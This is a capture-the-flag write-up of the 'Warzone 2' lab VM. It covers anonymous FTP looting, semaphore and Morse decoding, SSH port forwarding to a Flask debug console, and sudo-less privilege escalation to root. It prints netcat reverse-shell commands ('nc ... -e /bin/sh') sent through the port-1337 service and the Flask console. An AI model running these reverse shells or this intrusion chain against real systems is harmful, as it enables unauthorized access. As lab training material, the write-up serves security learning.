# Warzone: 2 Writeup
# Description
```bash
Enumeration, Flask, Port Forwarding, GTFObins

Created and Tested in Virtual box (NAT network)

Hint : lowercase letters
```

# Exploitation
Lets start with a network scan
```bash
 Currently scanning: 192.168.0.124/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 11 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 660                                                                                                                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.100   58:11:22:85:0d:41     10     600  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.127   00:0c:29:b9:89:5a      1      60  VMware, Inc.
```
\
Next, Open ports
```bash
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
1337/tcp open  waste   syn-ack ttl 64
```
\
Lets check port 21
```bash
ftp 192.168.0.127                                                                                                                        
Connected to 192.168.0.127.
220 (vsFTPd 3.0.3)
Name (192.168.0.127:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||58322|)
150 Here comes the directory listing.
dr-xr-xr-x    3 ftp      ftp          4096 Nov 08  2020 .
dr-xr-xr-x    3 ftp      ftp          4096 Nov 08  2020 ..
dr-xr-xr-x    2 ftp      ftp          4096 Nov 08  2020 anon
226 Directory send OK.
ftp> cd anon
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||23871|)
150 Here comes the directory listing.
dr-xr-xr-x    2 ftp      ftp          4096 Nov 08  2020 .
dr-xr-xr-x    3 ftp      ftp          4096 Nov 08  2020 ..
-rw-r--r--    1 ftp      ftp         13759 Nov 08  2020 password.PNG
-rw-r--r--    1 ftp      ftp          4911 Nov 08  2020 token.PNG
-rw-r--r--    1 ftp      ftp         10442 Nov 08  2020 username.PNG
226 Directory send OK.
ftp> get password.PNG
local: password.PNG remote: password.PNG
229 Entering Extended Passive Mode (|||28244|)
150 Opening BINARY mode data connection for password.PNG (13759 bytes).
100% |**********************************************************************************************************************************************************************| 13759       36.44 MiB/s    00:00 ETA
226 Transfer complete.
13759 bytes received in 00:00 (13.17 MiB/s)
ftp> get token.PNG
local: token.PNG remote: token.PNG
229 Entering Extended Passive Mode (|||30418|)
150 Opening BINARY mode data connection for token.PNG (4911 bytes).
100% |**********************************************************************************************************************************************************************|  4911       17.74 MiB/s    00:00 ETA
226 Transfer complete.
4911 bytes received in 00:00 (5.76 MiB/s)
ftp> get username.PNG
local: username.PNG remote: username.PNG
229 Entering Extended Passive Mode (|||16819|)
150 Opening BINARY mode data connection for username.PNG (10442 bytes).
100% |**********************************************************************************************************************************************************************| 10442       48.81 MiB/s    00:00 ETA
226 Transfer complete.
10442 bytes received in 00:00 (13.22 MiB/s)
ftp> exit
221 Goodbye.
```
\
<img width="385" height="146" alt="image" src="https://github.com/user-attachments/assets/38567d75-6c15-4e26-92a3-851c11745723" />
\
<img width="387" height="157" alt="image" src="https://github.com/user-attachments/assets/f64b2cdd-85fb-4382-ad41-1fbc3cfd0692" />
\
<img width="385" height="205" alt="image" src="https://github.com/user-attachments/assets/0c4418e9-f163-462e-ab3e-5282510e5a06" />
\
These 3 are the images , and we decode knowing that it is Flag Semaphore cipher
\
Decrypting we get 
```bash
USERNAME : semaphore

PASSWORD : signalperson
```
\
Using a simple script we get the token
```bash
833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26
```
\
then i checked the service on port 1337
```bash
nc 192.168.0.127 1337 -vvv
192.168.0.127: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.127] 1337 (?) open
# WARZONE 2 # WARZONE 2 # WARZONE 2 #
{SECRET SYSTEM REMOTE ACCESS}
Username :semaphore
Password :signalperson
Token :833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26
Success Login
[SIGNALS] { ls, pwd, nc}
[semaphore] > ls 
Wrong signal
[semaphore] > ls -la
Wrong signal
[semaphore] > ls
[+] Recognized signal
[+] sending......
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
warzone2-socket-server
[semaphore] > pwd
[+] Recognized signal
[+] sending......
/home/flagman
[semaphore] > nc 192.168.0.124 4444 -e sh
[+] Recognized signal
[+] sending......
[semaphore] > nc 192.168.0.124 4444 -e /bin/sh
[+] Recognized signal
[+] sending......
[semaphore] > 
```
\
Using the known credentials and using a reverse shell payload , we get a shell on penelope
```bash
penelope                  
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[-] Invalid shell from 192.168.0.127 🙄
[+] Got reverse shell from warzone2~192.168.0.127-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/warzone2~192.168.0.127-Linux-x86_64/2026_04_02-16_37_40-423.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@warzone2:/home/flagman$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@warzone2:/home/flagman$ 
```
\
Then i check around to find password
```bash
www-data@warzone2:/home/flagman$ cat warzone2-socket-server/.mysshpassword 
Did you know that i_hate_signals!
www-data@warzone2:/home/flagman$ su flagman
Password: 
flagman@warzone2:~$ id
uid=1001(flagman) gid=1001(flagman) groups=1001(flagman)
flagman@warzone2:~$ cat Desktop/bronze.txt 
         (                  )
       (  \                /  )
        \  \              /  /
         \  \    ____    /  /
          \  \_ //  \\ _/  /
           \   //    \\   /
            \_( BRONZE )_/
               \\    //
                \\__//

    FLAG : {*bronze_medal*}

```
\
then i checked for sudo permissions
```bash
flagman@warzone2:~/warzone2-socket-server$ sudo -l
Matching Defaults entries for flagman on warzone2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User flagman may run the following commands on warzone2:
    (admiral) NOPASSWD: /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py
```
\
We could execute a command as user "admiral" , so i executed it
```bash
flagman@warzone2:/home/admiral/warzone2-app$ sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py
 * Serving Flask app "wrz2-app" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 311-678-661
```
\
It ran a flask server with debugger on , but it was localhost accessible only , so i had to portforward this port to my attacker machine.
\
I use ssh portforwarding here , since we know the credentials and ssh is also active
```bash
ssh -L 9999:127.0.0.1:5000 flagman@192.168.0.127
```
\
Template ssh port forwarding syntax 
```bash
ssh -L <local_port>:<target_ip>:<target_port> user@vulnerable_host
```
\
Now if i open port 9999 on my burpsuite 
\
<img width="347" height="262" alt="image" src="https://github.com/user-attachments/assets/5d6244cb-39ef-4ae9-84ab-351c50a07221" />
\
Now remembering that the flask server was executed with debug mode on , we can try to go to /console and access it
\
<img width="1506" height="602" alt="image" src="https://github.com/user-attachments/assets/0b9b9150-31d6-45a7-aad6-e3b9a0326dc0" />
\
then i just used a simple python reverse shell while running penelope on port 4445
```bash
import os
os.system("nc 192.168.0.124 4445 -e /bin/sh")
```
\
Now we get shell as admiral 
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from warzone2~192.168.0.127-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/warzone2~192.168.0.127-Linux-x86_64/2026_04_02-16_58_22-802.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
admiral@warzone2:~/warzone2-app$ id
uid=1000(admiral) gid=1000(admiral) groups=1000(admiral),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),117(lpadmin),118(scanner)
admiral@warzone2:~$ cat Desktop/silver.txt 
         (                  )
       (  \                /  )
        \  \              /  /
         \  \    ____    /  /
          \  \_ //  \\ _/  /
           \   //    \\   /
            \_( SILVER )_/
               \\    //
                \\__//

    FLAG : {$silver_medal$}

```
\
and when i checked sudo pemissions again
```bash
admiral@warzone2:~$ sudo -l
Matching Defaults entries for admiral on warzone2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admiral may run the following commands on warzone2:
    (root) NOPASSWD: /usr/bin/less /var/public/warzone-rules.txt
```
\
We could read a file as root
\
I tried running the command , it was giivng something , so i just put the output into a file
```bash
admiral@warzone2:/tmp$ sudo -u root /usr/bin/less /var/public/warzone-rules.txt > fil
admiral@warzone2:/tmp$ cat fil 
.. ..-. / -.-- --- ..- / .-. . .- -.. / - .... .. ... / -- . ... ... .- --. . / -- . .- -. ... / - .... .- - / -.-- --- ..- / .- .-. . / .. -. / - .... . / .-- .- .-. --.. --- -. . / ..--- .-.-.- / .. / .-- .. ... .... / -.-- --- ..- / --. --- --- -.. / .-.. ..- -.-. -.- .-.-.- / .-. . -- . -- -... . .-. / - .... . / -- . -.. .- .-.. ... / .- .-. . / -. --- - / - .... . / .-. . .- .-.. / - .-. --- .--. .... .. . ... .-.-.- / - .... . / .-. . .- .-.. / - .-. --- .--. .... -.-- / .. ... / - .... .- - / -.-- --- ..- / --. .- .. -. / .- ..-. - . .-. / ... --- .-.. ...- .. -. --. / - .... .. ... / -... --- -..- .-.-.- / / -....- / .- .-.. .. . -. ..- -- / / .-. ..- .-.. . ... / / .... . .-.. .--. / -.-- --- ..- .-. / - . .- -- -- .- - . ... / -. . ...- . .-. / --.- ..- .. - / -.- . . .--. / - .-. .- .. -. .. -. --. /
```
\
It was morse code and decoding it gave
\
<img width="753" height="264" alt="image" src="https://github.com/user-attachments/assets/9b1c0022-7660-4b0e-b6ad-8a5e74dbe4f6" />
\
Then i checked gtfo bins to get a privesc method 
\
it gave this, run the sudo command and then at the end enter this and enter
\
<img width="161" height="55" alt="image" src="https://github.com/user-attachments/assets/bd0c2b4a-a093-41be-b13e-781a9b87f10c" />
\
```bash
root@warzone2:~# cat Desktop/gold.txt 
         (                  )
       (  \                /  )
        \  \              /  /
         \  \    ____    /  /
          \  \_ //  \\ _/  /
           \   //    \\   /
            \_(# GOLD #)_/
               \\    //
                \\__//

    FLAG : {# GOLD MEDAL #}
    NAME : WARZONE 2
    BY   : Alienum with <3
```
\
The end , Thank you for reading till here
